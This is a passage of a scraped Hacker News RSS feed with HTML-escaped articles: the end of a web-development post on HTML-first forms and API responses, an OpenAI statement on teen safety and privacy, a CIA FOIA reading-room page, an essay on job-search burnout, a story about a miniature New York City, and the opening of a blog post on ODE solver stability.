    &lt;p&gt;Here’s that same setup with HTML…&lt;/p&gt;
    &lt;code&gt;&amp;lt;form action="/login" method="POST"&amp;gt;
	&amp;lt;label for="username"&amp;gt;Username&amp;lt;/label&amp;gt;
	&amp;lt;input 
		id="username"
		type="text"
		required
	/&amp;gt;

	&amp;lt;label for="password"&amp;gt;Password&amp;lt;/label&amp;gt;
	&amp;lt;input 
		id="password"
		type="password" 
		required
	/&amp;gt;

	&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;
&amp;lt;/form&amp;gt;&lt;/code&gt;
    &lt;p&gt;And then you can enhance it with just a touch of JavaScript…&lt;/p&gt;
    &lt;code&gt;const form = document.querySelector('[action*="/login"]');
form.addEventListener('submit', event =&amp;gt; {
	event.preventDefault();
	const data = new FormData(form);
	const body = JSON.stringify(Object.fromEntries(data));
	fetch('/login', {
		method: 'POST',
		body
	});
});
&lt;/code&gt;
    &lt;p&gt;Hell, you can even do this in React if you want!&lt;/p&gt;
    &lt;code&gt;function Login () {

	function handleSubmit (event) {
		event.preventDefault();
		const data = new FormData(event.target);
		const body = JSON.stringify(Object.fromEntries(data));
		fetch('/login', {
			method: 'POST',
			body
		});
	}

	return (
		&amp;lt;form onSubmit={handleSubmit}&amp;gt;
			&amp;lt;label for="username"&amp;gt;Username&amp;lt;/label&amp;gt;
			&amp;lt;input 
				id="username"
				type="text"
				required
			/&amp;gt;

			&amp;lt;label for="password"&amp;gt;Password&amp;lt;/label&amp;gt;
			&amp;lt;input 
				id="password"
				type="password" 
				required
			/&amp;gt;

			&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;
		&amp;lt;/form&amp;gt;
	);
}&lt;/code&gt;
    &lt;head rend="h2"&gt;API responses&lt;/head&gt;
    &lt;p&gt;Another area where you can lean a lot more heavily on HTML is API responses.&lt;/p&gt;
    &lt;p&gt;Let’s say you have a &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt; that gets generated based on some data that’s specific to the user or some selections that have been made in a &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;In most modern apps, that means getting back some JSON, and generating a &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt; from it.&lt;/p&gt;
    &lt;code&gt;const app = document.querySelector('#app');

const request = await fetch('/my-wizards');
const response = await request.json();

app.innerHTML =
	`&amp;lt;table&amp;gt;
		&amp;lt;thead&amp;gt;
			&amp;lt;tr&amp;gt;
				&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;
				&amp;lt;th&amp;gt;Location&amp;lt;/th&amp;gt;
				&amp;lt;th&amp;gt;Powers&amp;lt;/th&amp;gt;
			&amp;lt;/tr&amp;gt;
		&amp;lt;/thead&amp;gt;
		&amp;lt;tbody&amp;gt;
		${response.wizards.map(wizard =&amp;gt; {
			const {name, location, powers} = wizard;
			const row = 
				`&amp;lt;tr&amp;gt;
					&amp;lt;td&amp;gt;${name}&amp;lt;/td&amp;gt;
					&amp;lt;td&amp;gt;${location}&amp;lt;/td&amp;gt;
					&amp;lt;td&amp;gt;${powers}&amp;lt;/td&amp;gt;
				&amp;lt;/tr&amp;gt;`;
			return row;
		}).join('')}
		&amp;lt;/tbody&amp;gt;
	&amp;lt;/table&amp;gt;`;
&lt;/code&gt;
    &lt;p&gt;But if a server has to do the work of getting that information and sending it back to you anyways, it could also just send the &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt; HTML, which you could then render into the UI.&lt;/p&gt;
    &lt;code&gt;const app = document.querySelector('#app');

const request = await fetch('/my-wizards');
const response = await request.text();

app.innerHTML = response;
&lt;/code&gt;
    &lt;head rend="h2"&gt;There are workflow changes&lt;/head&gt;
    &lt;p&gt;This, of course, changes the workflow of building apps quite a bit.&lt;/p&gt;
    &lt;p&gt;A lot of work shifts to the backend that in today’s apps is handled with client-side code. But… that’s a good thing?&lt;/p&gt;
    &lt;p&gt;It means faster, simpler apps that behave more predictably and reliably.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261480</guid><pubDate>Tue, 16 Sep 2025 12:45:58 +0000</pubDate></item><item><title>Teen Safety, Freedom, and Privacy</title><link>https://openai.com/index/teen-safety-freedom-and-privacy</link><description>&lt;doc fingerprint="311f117605a647b5"&gt;
  &lt;main&gt;
    &lt;p&gt;Some of our principles are in conflict, and we’d like to explain the decisions we are making around a case of tensions between teen safety, freedom, and privacy.&lt;/p&gt;
    &lt;p&gt;It is extremely important to us, and to society, that the right to privacy in the use of AI is protected. People talk to AI about increasingly personal things; it is different from previous generations of technology, and we believe that they may be one of the most personally sensitive accounts you’ll ever have. If you talk to a doctor about your medical history or a lawyer about a legal situation, we have decided that it’s in society’s best interest for that information to be privileged and provided higher levels of protection. We believe that the same level of protection needs to apply to conversations with AI which people increasingly turn to for sensitive questions and private concerns. We are advocating for this with policymakers.&lt;/p&gt;
    &lt;p&gt;We are developing advanced security features to ensure your data is private, even from OpenAI employees. Like privilege in other categories, there will be certain exceptions: for example, automated systems will monitor for potential serious misuse, and the most critical risks—threats to someone’s life, plans to harm others, or societal-scale harm like a potential massive cybersecurity incident—may be escalated for human review.&lt;/p&gt;
    &lt;p&gt;The second principle is about freedom. We want users to be able to use our tools in the way that they want, within very broad bounds of safety. We have been working to increase user freedoms over time as our models get more steerable. For example, the default behavior of our model will not lead to much flirtatious talk, but if an adult user asks for it, they should get it. For a much more difficult example, the model by default should not provide instructions about how to commit suicide, but if an adult user is asking for help writing a fictional story that depicts a suicide, the model should help with that request. “Treat our adult users like adults” is how we talk about this internally, extending freedom as far as possible without causing harm or undermining anyone else’s freedom.&lt;/p&gt;
    &lt;p&gt;The third principle is about protecting teens. We prioritize safety ahead of privacy and freedom for teens; this is a new and powerful technology, and we believe minors need significant protection.&lt;/p&gt;
    &lt;p&gt;First, we have to separate users who are under 18 from those who aren’t (ChatGPT is intended for people 13 and up). We’re building an age-prediction system to estimate age based on how people use ChatGPT. If there is doubt, we’ll play it safe and default to the under-18 experience. In some cases or countries we may also ask for an ID; we know this is a privacy compromise for adults but believe it is a worthy tradeoff.&lt;/p&gt;
    &lt;p&gt;We will apply different rules to teens using our services. For example, ChatGPT will be trained not to do the above-mentioned flirtatious talk if asked, or engage in discussions about suicide of self-harm even in a creative writing setting. And, if an under-18 user is having suicidal ideation, we will attempt to contact the users’ parents and if unable, will contact the authorities in case of imminent harm. We shared more today about how we’re building the age-prediction system and new parental controls to make all of this work.&lt;/p&gt;
    &lt;p&gt;We realize that these principles are in conflict and not everyone will agree with how we are resolving that conflict. These are difficult decisions, but after talking with experts, this is what we think is best and want to be transparent in our intentions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261659</guid><pubDate>Tue, 16 Sep 2025 13:02:20 +0000</pubDate></item><item><title>CIA Freedom of Information Act Electronic Reading Room</title><link>https://www.cia.gov/readingroom</link><description>&lt;doc fingerprint="ff12d0edc8a52e8d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Freedom of Information Act Electronic Reading Room&lt;/head&gt;
    &lt;p&gt;Welcome to the Central Intelligence Agency's Freedom of Information Act Electronic Reading Room.&lt;/p&gt;
    &lt;head rend="h1"&gt;What is the Electronic Reading Room?&lt;/head&gt;
    &lt;head rend="h1"&gt;What's New on the Electronic Reading Room?&lt;/head&gt;
    &lt;quote&gt;
      &lt;p&gt;Nixon and the People’s Republic of China: CIA’s Support of the Historic 1972 Presidential Trip&lt;/p&gt;
      &lt;p&gt;This collection marks the 50th anniversary of President Richard M. Nixon’s February 1972 trip to the People’s Republic of China (PRC) – a landmark event that preceded the establishment of diplomatic relations between the two countries. This small collection, consisting of three city guides, an atlas, and four leadership profiles, is a subset of the materials CIA produced for President Nixon and National Security Advisor Henry Kissinger in preparation for the seven-day visit.&lt;/p&gt;
      &lt;p&gt;City guides were produced on Peking (Beijing), Shanghai, and Hang-Chou (Hangzhou)1, as these cities were part of President Nixon’s tour of the PRC. Each guide included a brief history of the city, contemporary maps and photographs, and descriptions of geography, climates, and points of interest.&lt;/p&gt;
      &lt;p&gt;CIA also produced an 82-page atlas of the PRC for President Nixon’s trip. The US government distributed more than 4,000 copies to government customers and non-government institutions and libraries, and sold 30,000 copies to the public for a short period after the trip for $5.25, or $35.19 in today’s dollars. This is the first time in fifty years CIA has made the atlas available to the public.&lt;/p&gt;
      &lt;p&gt;This collection also includes leadership profiles—assessments that CIA provides US Presidents and other policymakers to assist them in understanding their foreign counterparts. The profiles in this collection include Chinese Communist Party (CCP) Chairman Mao Tse-tung (Mao Zedong) and Premier Chou En-lai (Zhou Enlai). A profile of Lin Piao (Lin Biao), Vice Chair of the CCP, prepared for this trip is also included in this collection; however, Lin died in a plane crash five months before President Nixon’s visit.&lt;/p&gt;
      &lt;p&gt;_____________________&lt;/p&gt;
      &lt;p&gt;1 CIA did not begin using the non-Romanization spelling of Beijing and Hangzhou until 1979. This article provides updated spellings elsewhere in parentheses.&lt;/p&gt;
      &lt;p&gt;See The Nixon Collection (8 documents/331 pages).&lt;/p&gt;
      &lt;p&gt;Current/Central Intelligence Bulletin Collection&lt;/p&gt;
      &lt;p&gt;Central Intelligence Bulletin&lt;/p&gt;
      &lt;p&gt;Harry Truman was the first U.S. president to receive a daily intelligence digest. At his direction, the Daily Summary began production in February 1946, and continued until February 1951. President Truman was pleased with the product, but a survey group commissioned by the National Security Council in 1949 was critical of the Daily Summary and issued several recommendations to improve it. The new version, called the Current Intelligence Bulletin, began production on 28 February 1951, and this remained the format of the president's daily digest through Dwight Eisenhower's two terms, although it was retitled the Central Intelligence Bulletin in 1958. The Current/Central Intelligence Bulletin grew longer than its predecessor over time with the addition of more items and more analysis, and would eventually contain more graphics as printing technology improved.&lt;/p&gt;
      &lt;p&gt;The new Kennedy Administration confronted a full array of international issues in 1961. In April, a group of CIA-trained Cuban exiles landed at the Bay of Pigs on the southern coast of Cuba with the goal of overthrowing the Fidel Castro regime and establishing an anti-Communist government. The outnumbered invading force was quickly repelled by Castro's troops. The year's reports were dominated by the worsening Congo crisis, with the fragmentation of the country widening despite the efforts of the United Nations, and US concern over the high tempo of Soviet testing of space vehicles and intercontinental ballistic missiles. The situation in Laos deteriorated, as the Communist Pathet Lao insurgency gained strength against the US-backed Royal Lao government.&lt;/p&gt;
      &lt;p&gt;The changes at the CIA following the Bay of Pigs included a format update for the president's daily intelligence report. The new version, called the President's Intelligence Checklist (PICL), was first delivered on 17 June 1961. The Central Intelligence Bulletin continued to be produced as a separate publication until 10 Jan 1974, when it was replaced by the National Intelligence Daily. The PICL, however, was the president's primary written intelligence source through the remainder of the Kennedy Administration. The Kennedy PICL reports are available here&lt;/p&gt;
      &lt;p&gt;This historical release includes: the Central Intelligence Bulletin reports from 2 January-30 June 1961 (2752 pages).&lt;/p&gt;
      &lt;p&gt;This release is the thirteenth and final release in the Current/Central Intelligence Bulletin series.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;aquiline adj. of or like the eagle.&lt;/p&gt;
      &lt;p&gt;Aerial intelligence collection platforms have played a critical role in US national security from the earliest beginnings of aviation. CIA's 1960s OXCART Program and its use of U-2s are examples of collection innovations that have kept US leaders informed about adversaries' capabilities and intentions. Despite their success, however, use of these platforms carried significant risks and repercussions, including detection and even pilot loss, such as the downing of the U-2 flown by Francis Gary Powers in 1960. Ever-evolving research by the CIA led to the development concept of unmanned aerial vehicles (UAVs) as collection platforms. An innovative Agency program in the 1960s codenamed Aquiline was the very first to test this concept. Based initially on the study of flight characteristics of birds, Aquiline was envisioned as a long-range vehicle that could safely and stealthily provide a window into denied areas such as the Soviet Union through photography and other capabilities, and would even support in-place agent operations. While it never became operational, the concept proved invaluable as a forerunner to today's multi-capability UAVs.&lt;/p&gt;
      &lt;p&gt;Learn more about CIA's early eagle (40 documents/289 pages).&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;The Collapse of Communism in Eastern Europe: A 30-Year Legacy&lt;/p&gt;
      &lt;p&gt;The Collapse of Communism in Eastern Europe: A 30-Year Legacy&lt;/p&gt;
      &lt;p&gt;This collection includes a broad sampling of articles from the National Intelligence Daily—the CIA's principal form of current intelligence analysis at the time—from February 1989 to March 1990. These articles represent much of the Agency's short-term analysis of events unfolding in Central and Eastern Europe as popular opposition to Soviet misrule erupted and quickly surpassed anything the Communist regimes were prepared to understand or to which they could respond. The material also represents a major source of information and insight for US policymakers into what was happening in these countries, where the situation was heading, and how a collapse of Communist rule in Europe and the beginnings of the breakup of the Soviet Union would impact Europe and the United States.&lt;/p&gt;
      &lt;p&gt;Please note: Some of the material is marked "NR" or "not relevant." This means that material is unrelated to events in Central and Eastern Europe, and was therefore not reviewed for declassification as part of this collection.&lt;/p&gt;
      &lt;p&gt;Learn more about the collapse of Communist rule in Europe (105 documents/151 pages)&lt;/p&gt;
    &lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261764</guid><pubDate>Tue, 16 Sep 2025 13:10:29 +0000</pubDate></item><item><title>When the job search becomes impossible</title><link>https://www.jeffwofford.com/wp/?p=2240</link><description>&lt;doc fingerprint="7748915723d08eaf"&gt;
  &lt;main&gt;
    &lt;p&gt;I have the good fortune to have a job right now, but many of my friends are out of work. Most have been searching for a while. Some are encountering a problem that has my full sympathy, something I’ve experienced myself at various times. I’m not sure I can solve it, but maybe I can help put words to what some are going through.&lt;/p&gt;
    &lt;p&gt;The problem unfolds in three distinct phases as the job search drags on.&lt;/p&gt;
    &lt;head rend="h2"&gt;Phase I: The Obvious but Impossible Search&lt;/head&gt;
    &lt;p&gt;You’ve spent several months sending out scores of carefully tailored resumes and cover letters for jobs you know you are fully qualified for and would excel at. Usually you get no response. Occasionally you get a polite “position filled.” That’s it.&lt;/p&gt;
    &lt;p&gt;You’re knocking on all the obvious doors—all the jobs closest to what you’ve been doing—and nothing is opening up. It’s exhausting and frustrating. The very act of telling your friends you’re “discouraged” feels like swallowing a horse pill; “discouraged” does not reach the depths of your fear and despair.&lt;/p&gt;
    &lt;p&gt;The obvious path forward—finding a job in line with your resume—no longer looks like a path. It looks like The Cliffs of Insanity. What used to feel like the Obvious Way Forward now feels like the Impossible Way Forward. Somewhere in your brain there is a tank of gasoline that gets burned each time you force yourself to do something irksome. That tank has burned down to vapors.&lt;/p&gt;
    &lt;p&gt;You are burned out. You are burned out on search. You are burned out on an impossible search.&lt;/p&gt;
    &lt;p&gt;But you can’t stay still. So your mind looks for new paths.&lt;/p&gt;
    &lt;head rend="h2"&gt;Phase II: The Adjacent-to-Impossible Search&lt;/head&gt;
    &lt;p&gt;You consider job openings that aren’t quite aligned with what you were doing but might offer better chances. Maybe it’s in an adjacent industry, a slightly different role, or somewhere you never really wanted to live. Maybe you could take a small pay cut. Maybe an hour’s commute wouldn’t be so bad. You expand your search away from the impossible to a broader horizon, to things that are adjacent to impossible.&lt;/p&gt;
    &lt;p&gt;This often works! The compromises can turn out better than expected. A pay cut can lead to a quick raise that puts you ahead of your prior pay. Sometimes they turn out worse than expected, but the next job search goes better—new connections, new head space, more time for the market to improve.&lt;/p&gt;
    &lt;p&gt;Sometimes it doesn’t work. The employers don’t bite. The required compromises are just too dire. The adjacent-to-impossible jobs turn out to be impossible too.&lt;/p&gt;
    &lt;p&gt;You are burned out. You are very burned out. The creativity and spunk it took to expand your horizons has gone nowhere. That extra spark has died. The brain’s reserve gas tank is now showing “E.” You are suffering from a disease we call Adjacent-to-Impossible Search Burnout (AISB, for the medical professionals in the room).&lt;/p&gt;
    &lt;p&gt;But you can’t stay still. So your mind looks for new paths.&lt;/p&gt;
    &lt;head rend="h2"&gt;Phase III: Weird Search&lt;/head&gt;
    &lt;p&gt;Well, if none of the obvious or even next-to-obvious stuff is working, why hang around? Throw the gates wide open, go ronin, walk the whole horizon, drag the whole ocean. You could learn to make jewelry and open an Etsy shop. You could band together with friends and make that little app you’ve always talked about. You could open up that little coffee shop, that bakery, that catering business. You could go back to college and learn a new career.&lt;/p&gt;
    &lt;p&gt;It feels like giving up, though, doesn’t it? Wait, no! It feels like taking charge of your own destiny, plotting your own course, becoming master of your fate, all that sort of thing! Except, geez, at maybe one-half, one-fourth the pay, if you’re lucky? Maybe less, if you’re paying for college before you even start this new career.&lt;/p&gt;
    &lt;p&gt;And yet… what’s the alternative? Getting paid zero for the foreseeable future? Continuing to churn out groveling resumes and “I can’t wait to work at your wonderful company that doesn’t have the internal culture of decency or self-discipline to bother responding to this application that you invited, from someone you know really needs answers right now” cover letters?&lt;/p&gt;
    &lt;p&gt;So yes, you go weird, at least mentally, and you entertain ideas about what else in tarnation might possibly pay you a living wage while using your talents and filling up your joy-meter.&lt;/p&gt;
    &lt;p&gt;And sometimes this goes great. Almost every company or product we love started more or less like this. The next one might be yours. I like the weird path, and if you take it and it blossoms, I salute you and I bless you.&lt;/p&gt;
    &lt;p&gt;But we’re here for the ones that are still stuck in this place, this third phase.&lt;/p&gt;
    &lt;p&gt;You have been thwarted by the Cliffs of Insanity. You have become nauseated by the Wide World of Compromise. But nowhere else on your broad horizon has yet called you forward.&lt;/p&gt;
    &lt;p&gt;And here’s the deal: here’s how you know you are really at the end of the rope: you are sick of freaking thinking about it.&lt;/p&gt;
    &lt;p&gt;You are sicking of trying to find jobs you should have. You are sick of trying to find jobs you could have. You are sick of trying to find jobs you shouldn’t have—jobs that could be fun but would make your grandmother shake her head a little. You are burned out on search. All possible gas tanks are empty. All the creative-hopeful-bright-idea-one-more-try sauce is gone, dried up, kaput.&lt;/p&gt;
    &lt;p&gt;You are Burned Out On Search (BOOS for the professionals). That’s the problem. That’s the disease. You’re welcome.&lt;/p&gt;
    &lt;head rend="h2"&gt;Solutions&lt;/head&gt;
    &lt;p&gt;I don’t know. I can’t solve your problem. If your problem wasn’t genuinely hard you would have solved it already. Some stranger who doesn’t know your situation ain’t gonna solve it. But here are some notes I’ve picked up along similar roads.&lt;/p&gt;
    &lt;p&gt;You’re not alone. A lot, a lot of people are in this boat right now, and frankly, in any given year somebody, probably somebody you know, is in this boat. As I write, 40% of unemployed people have been out of work for at least 15 weeks. That’s almost four months. Fully a fourth have been unemployed at least 27 weeks: over six months. Unemployment is not strange or rare. Happens to everybody: good, capable people who did miracles at prior organizations and will do them again, they just can’t do them right now.&lt;/p&gt;
    &lt;p&gt;It sucks real bad. Let’s not understate the horror of unemployment in a modern economy. Talk about a Cliff of Insanity: there is an unbelievable drop in wellbeing from the employed to unemployed. I don’t need to spell it all out—the money stuff, the healthcare stuff, the embarrassment, the boredom, the fear. It’s bad.&lt;/p&gt;
    &lt;p&gt;And yet somehow in the grand scheme of social sympathy and compassion, unemployment doesn’t get a lot of loving. Tell folks you’ve got knee problems, house foundation problems, college debt, divorce, death in the family, hair stylist went rogue this morning and messed up your cowlick, and here comes all kinds of sympathy. Tell them you’re unemployed, what do you get? “Oh yeah I was unemployed one month ten years ago boy that sucked.” Yes, friend, yes it does suck right now six months in, and unlike your little story there I don’t know when or if it will ever stop.&lt;/p&gt;
    &lt;p&gt;But I do feel you. High five. I feel you.&lt;/p&gt;
    &lt;p&gt;It won’t turn out as bad as you fear. How often have you known somebody whose life was really, finally wrecked by unemployment? I mean, they truly never got back on their feet. Maybe previously they had a decent home, but then they became homeless, and now they’re still homeless? I’m not just talking about stories and imagination and movies right now, I’m talking about who do you personally know who’s had it go that badly?&lt;/p&gt;
    &lt;p&gt;And look, it does happen. I’m not saying that 100% of people spring back from unemployment. But in your experience what percentage of people get back to a decent place? 90%? It’s got to be more than that. 95%? 99%? Most of the time, your friends and family members go through a period of unemployment and then they find a new, good life on the other side. It might be in the obvious place, it might not be. It might be on one of those “weird paths” we talked about, but very often the new path, no matter how weird, becomes stable and sufficient and even joyful.&lt;/p&gt;
    &lt;p&gt;People—you—are more resilient and resourceful than you think. You are skillful at imagining bad outcomes. You are also skillful at avoiding them. Do yourself a favor, set aside the imagining bad outcomes skill for a year or two and focus for now on the avoiding skill—and the finding skill that runs along with it.&lt;/p&gt;
    &lt;p&gt;It’s okay to rest. This is the best lesson I’ve learned from these kinds of seasons. When you’ve searched and you’ve searched without success until you’re sick of searches, usually the lesson is: now it’s time to rest.&lt;/p&gt;
    &lt;p&gt;There is a time for hard work, very hard work. There’s a time to push yourself, even to push beyond the limits of what you think you can endure. But a time comes when you are at the limit, at least for now. In those times, the word is “rest.”&lt;/p&gt;
    &lt;p&gt;Rest is much more than mere idleness. When you rest you give your mind the space to explore possibilities it never had time to consider. Often this exploration happens without your knowing it. Suddenly you see a new way to tackle that challenge. Or you realize it was the wrong challenge to begin with, that what you needed was a different quest. Rest refuels the mind. It refills the gas tanks. It untwists wounded joints. It builds up sore muscles.&lt;/p&gt;
    &lt;p&gt;We’re not talking about watching eight hours of YouTube every day or playing video games till 4 AM. Rest is all about space. It engages purposefully with serious boredom. You’re going to need to get in there and stare at some ceilings—or better yet, from a hammock, at some skies. Give the mind space to think.&lt;/p&gt;
    &lt;p&gt;Rest should involve time with friends but also plenty of solitude. It ought to involve some deep reading—books, not just the short pieces—especially those that are full of new ideas, not on the usual menu, surprising perspectives that get your thoughts percolating.&lt;/p&gt;
    &lt;p&gt;Rest needs to be done well. Set your alarm. Make appointments and keep them. Get outside. Use your hands.&lt;/p&gt;
    &lt;p&gt;When you’re Burned Out On Search, what do you do next? When we ask it that way the answer becomes obvious. You rest. It’s the only antidote to burn out. Give your mind time to rebuild and it will find ways forward that you never expected. Sometimes the best way to search is… not to search.&lt;/p&gt;
    &lt;head rend="h3"&gt;Discover more from Holy Ghost Stories&lt;/head&gt;
    &lt;p&gt;Subscribe to get the latest posts sent to your email.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261848</guid><pubDate>Tue, 16 Sep 2025 13:18:00 +0000</pubDate></item><item><title>Trucker built a scale model of NYC over 21 years</title><link>https://gothamist.com/arts-entertainment/this-trucker-built-a-scale-model-of-nyc-over-21-years-its-drawing-museums-attention</link><description>&lt;doc fingerprint="3d9add1738a0ec3b"&gt;
  &lt;main&gt;
    &lt;p&gt;Reno may be “the biggest little city in the world,” but it's got some serious competition from the miniature New York City that hobbyist Joseph Macken built in his upstate New York basement over two decades.&lt;/p&gt;
    &lt;p&gt;“I sat down in my basement, turned the camera on on my phone and just started talking about my first section, which was Downtown Manhattan,” the Clifton Park resident said on a recent Thursday about his viral TikToks on his roughly 50-by-30-foot scale model of the city. “It just took off.”&lt;/p&gt;
    &lt;p&gt;The intricate model features what Macken says are hundreds of thousands buildings, landmarks and geographic elements across the five boroughs and their surroundings, including bridges, airports, the Hudson and East rivers, New York Harbor, Central Park, One World Trade Center and the original World Trade Center, the Statue of Liberty and Empire State Building. The work consists of 350 handmade sections that are pieced together and can be taken apart and moved.&lt;/p&gt;
    &lt;p&gt;Macken’s videos, which he began posting on TikTok this spring at his children’s urging, have garnered well over 20 million views and myriad praise in recent months. In them, he discusses his creative process and takes viewers on helicopter-like tours of his hometown.&lt;/p&gt;
    &lt;p&gt;“We’re about maybe 2,000 feet off the ground, looking down on all the houses and all the neighborhoods,” he says in a video posted earlier this week.&lt;/p&gt;
    &lt;p&gt;“This is genuinely unreal,” one commenter responded.&lt;/p&gt;
    &lt;p&gt;“Don't sell it for under $10 million,” another noted.&lt;/p&gt;
    &lt;p&gt;“A museum needs to display this ASAP,” YouTube’s official account commented on one of Macken’s clips in July.&lt;/p&gt;
    &lt;p&gt;Macken, a 63-year-old truck driver who grew up in Middle Village and has no formal carpentry or engineering training, said he dreamed of replicating the Queens Museum’s famous “Panorama” after an elementary school trip when he was a kid. He embarked on the endeavor in 2004, armed with little more than balsa wood, Elmer’s glue and Styrofoam. His first building was “the RCA building at Rockefeller Center,” he said, referring to 30 Rock, which was formerly named for its longtime tenant, the Radio Corporation of America.&lt;/p&gt;
    &lt;p&gt;Macken said it took him about 10 years to build Manhattan alone and 11 years for the rest of the boroughs. He completed his opus in April, and said he’s confident every building in the city is represented. (Gothamist could not independently verify this claim; the city has more than 1 million buildings, according to the Department of Buildings.)&lt;/p&gt;
    &lt;p&gt;“ I jumped outta my chair and I cheered,” Macken said of the moment he finished the last building, a house on Staten Island.&lt;/p&gt;
    &lt;p&gt;The project had outgrown Macken’s basement, but he’d built it so it could be broken down into panels and taken to a storage unit. He said it would have stayed there and collected dust if his kids had not encouraged him to get on TikTok and start sharing videos of the model.&lt;/p&gt;
    &lt;p&gt;Then, in early August, someone he delivered to on his truck route suggested he set up the model at a local event they were sponsoring. So Macken’s mini New York went up at the Cobleskill Fairgrounds near Albany, and can be seen there through Friday. It’s the first public display of the completed work.&lt;/p&gt;
    &lt;p&gt;Macken is now working on a mini Minneapolis: “‘Mary Tyler Moore’ was one of my favorite shows growing up,” he said, adding that he plans to eventually do Los Angeles, Las Vegas and Chicago as well.&lt;/p&gt;
    &lt;p&gt;Some fans said they drove from as far as Baltimore to see the mini NYC in person.&lt;/p&gt;
    &lt;p&gt;“Pictures do not do justice. This was a masterpiece to witness in person today and well worth the three-and-a-half-hour drive,” one TikTok user commented.&lt;/p&gt;
    &lt;p&gt;Macken said he’s still figuring out what he’ll do next with the model, but he’s in talks with the Museum of the City of New York in Manhattan about an exhibit there. A museum spokesperson confirmed this, praising his “ingenuity, creativity and skill.”&lt;/p&gt;
    &lt;p&gt;“ I don't wanna put it back in storage,” Macken said. “That's for damn sure.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261877</guid><pubDate>Tue, 16 Sep 2025 13:20:11 +0000</pubDate></item><item><title>Generative AI is hollowing out entry-level jobs, study finds</title><link>https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5425555</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261930</guid><pubDate>Tue, 16 Sep 2025 13:24:35 +0000</pubDate></item><item><title>Implicit Ode Solvers Are Not Universally More Robust Than Explicit Ode Solvers</title><link>https://www.stochasticlifestyle.com/implicit-ode-solvers-are-not-universally-more-robust-than-explicit-ode-solvers-or-why-no-ode-solver-is-best/</link><description>&lt;doc fingerprint="3f09c854abe7bb95"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Implicit ODE Solvers Are Not Universally More Robust than Explicit ODE Solvers, Or Why No ODE Solver is Best&lt;/head&gt;
    &lt;head rend="h4"&gt;September 4 2025 in Differential Equations, Julia, Mathematics, Programming | Tags: bdf, euler, explicit, implicit, numerical analysis, ode, runge-kutta, solver | Author: Christopher Rackauckas&lt;/head&gt;
    &lt;p&gt;A very common adage in ODE solvers is that if you run into trouble with an explicit method, usually some explicit Runge-Kutta method like RK4, then you should try an implicit method. Implicit methods, because they are doing more work, solving an implicit system via a Newton method having “better” stability, should be the thing you go to on the “hard” problems.&lt;/p&gt;
    &lt;p&gt;This is at least what I heard at first, and then I learned about edge cases. Specifically, you hear people say “but for hyperbolic PDEs you need to use explicit methods”. You might even intuit from this “PDEs can have special properties, so sometimes special things can happen with PDEs… but ODEs, that should use implicit methods if you need more robustness”. This turns out to not be true, and really understanding the ODEs will help us understand better why there are some PDE semidiscretizations that have this “special cutout”.&lt;/p&gt;
    &lt;p&gt;What I want to do in this blog post is more clearly define what “better stability” actually means, and show that it has certain consequences that can sometimes make explicit ODE solvers actually more robust on some problems. And not just some made-up problems, lots of real problems that show up in the real world.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Quick Primer on Linear ODEs&lt;/head&gt;
    &lt;p&gt;First, let’s go through the logic of why implicit ODE solvers are considered to be more robust, which we want to define in some semi-rigorous way as “having a better chance to give an answer closer to the real answer”. In order to go from semi-rigorous into a rigorous definition, we can choose a test function, and what better test function to use than a linear ODE. So let’s define a linear ODE:&lt;/p&gt;
    &lt;p&gt;$$u’ = \lambda u$$&lt;/p&gt;
    &lt;p&gt;is the simplest ODE. We can even solve it analytically, $u(t) = \exp(\lambda t)u(0)$. For completeness, we can generalize this to a linear system of ODEs, where instead of having a scalar $u$ we can let $u$ be a vector, in which case the linear ODE has a matrix of parameters $A$, i.e.&lt;/p&gt;
    &lt;p&gt;$$u’ = Au$$&lt;/p&gt;
    &lt;p&gt;In this case, if $A$ is diagonalizable, $A = P^{-1}DP$, then we can replace $A$:&lt;/p&gt;
    &lt;p&gt;$$u’ = P^{-1}DP u$$&lt;/p&gt;
    &lt;p&gt;$$Pu’ = DPu$$&lt;/p&gt;
    &lt;p&gt;or if we let $w = Pu$, then&lt;/p&gt;
    &lt;p&gt;$$w’ = Dw$$&lt;/p&gt;
    &lt;p&gt;where $D$ is a diagonal matrix. This means that for every element of $w$ we have the equation:&lt;/p&gt;
    &lt;p&gt;$$w_i’ = \lambda_i w_i$$&lt;/p&gt;
    &lt;p&gt;where $w_i$ is the vector in the direction of the $i$th eigenvector of $A$, and $\lambda_i$ is the $i$th eigenvalue of $A$. Thus our simple linear ODE $u’ = \lambda u$ tells us about general linear systems along the eigenvectors. Importantly, since even for real $A$ we can have $\lambda$ be a complex number, i.e. real-valued matrices can have complex eigenvalues, it’s important to allow for $\lambda$ to be complex to understand all possible systems.&lt;/p&gt;
    &lt;p&gt;But why is this important for any other ODE? Well by the Hartman-Grobman theorem, for any sufficiently nice ODE:&lt;/p&gt;
    &lt;p&gt;$$u’ = f(u)$$&lt;/p&gt;
    &lt;p&gt;We can locally approximate the ODE by:&lt;/p&gt;
